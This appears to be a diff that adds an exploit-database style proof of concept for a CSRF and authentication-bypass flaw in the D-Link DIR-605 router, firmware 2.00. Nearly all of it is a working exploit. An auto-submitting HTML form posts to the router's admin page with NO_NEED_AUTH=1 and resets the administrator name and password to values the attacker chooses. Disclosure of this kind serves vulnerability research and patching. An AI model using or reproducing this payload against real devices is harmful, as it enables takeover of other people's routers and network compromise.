@@ -1,0 +1,19 @@
+# Exploit Title: D-Link DIR-605 CSRF Vulnerability
+# Date: 20-03-2012
+# Author: iqzer0++
+# Version: Firmware Version : 2.00
+# Tested on: DIR-605
+
+This allows unauthroized access to the device and post injections
+
+<html>
+<form name="bypass" action="
+http://xxx.xxx.xxx.xxx/tools_admin.php?NO_NEED_AUTH=1&AUTH_GROUP=0"
+method="post">
+       <input type="hidden" name="ACTION_POST" value="1" />
+        <input type="hidden" name="admin_name" value="iqzer0" />
+        <input type="hidden" name="admin_password1" value="bypass" />
+        <input type="hidden" name="admin_password2" value="bypass" />
+</form>
+<script>document.bypass.submit();</script>
+</html>
